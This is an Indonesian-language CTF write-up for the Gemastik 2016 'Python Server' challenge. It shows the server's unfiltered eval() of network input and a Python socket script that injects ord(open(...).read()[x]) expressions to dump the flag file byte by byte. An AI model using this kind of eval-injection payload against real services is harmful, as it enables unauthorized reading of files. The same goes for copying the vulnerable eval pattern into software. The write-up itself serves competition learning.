---
layout: post
title: "Gemastik CTF 2016 : Python Server - 100"
description: "Writeup Gemastik 2016 Online Capture The Flag Qualification"
headline: 
modified: 2016-08-15
date: 2016-08-15
category: CTF
tags: [gemastik,Pwnable]
imagefeature: /images/gemastik.png
mathjax: 
chart: 
comments: true
featured: false
---

### Problem :

![Python Server](/images/python-server.png)


### Solusi :

Di dalam source code yang di berikan ternyata terlihat input yang kita berikan di jalankan di dalam *eval()*

```python
    req.sendall("Dec to Hex Converter - Insert number : ")
    number = req.recv(512)[:-1]
    req.sendall(hex(eval(number)) + "\n")
```

input kita pun tidak di filter dan memungkinkan kita untuk menjalankan expression sesuka kita, di dalam source code juga
ada baris code ini `flag = open('PythonServer.flag').read()` terlihat bahwa flag tersimpan di PythonServer.flag 
kemudian kita gunakan `ord(open('PythonServer.flag').read()[0])` untuk mengambil per index dari file PythonServer.flag
dan mengirimkan dalam bentuk decimal nanti output nya dalam bentuk hex. untuk mempercepat dump flag kami gunakan python.

```python
import socket

s = "target.netsec.gemastik.ui.ac.id"
port = 13338

result = ""
sock = socket.socket()
sock.connect((s, port))

print sock.recv(2048)
print sock.recv(2048)
sock.send("guest\n")
sock.send("guest\n")
x = 0

print sock.recv(2048)

while True:
    print sock.recv(2048)
    sock.send("hex\n")
    print sock.recv(2048)
    sock.send("ord(open('PythonServer.flag').read()["+str(x)+"])\n")
    data = sock.recv(2048)
    if "Please insert number" in data :
        break
    flags = chr(int(data,16))
    result += flags
    print data
    x += 1    
    
print result.rstrip('\n')
```

![Python Server Flag](/images/python-server-flag.png)
